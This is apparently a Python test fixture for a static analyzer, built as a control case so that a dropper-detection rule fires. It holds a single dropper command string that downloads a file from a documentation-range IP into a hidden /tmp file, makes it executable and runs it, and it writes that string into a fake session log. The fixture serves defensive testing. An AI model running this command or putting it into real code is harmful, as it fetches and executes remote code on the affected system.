"""Static analyzer control. Never install or publish this fixture.

Counterfactual to synth_fake_session_controls.py: byte-identical dropper
string outside a synth_* file, so the hidden-stage composite must fire.
"""
SESSION_UPLOAD = "wget http://198.51.100.42:8080/m -O /tmp/.m && chmod +x /tmp/.m && /tmp/.m &"


def main():
    with open("fake_session.log", "w") as fh:
        fh.write("[00:00:01] DATA_RECV: " + SESSION_UPLOAD + "\n")


main()
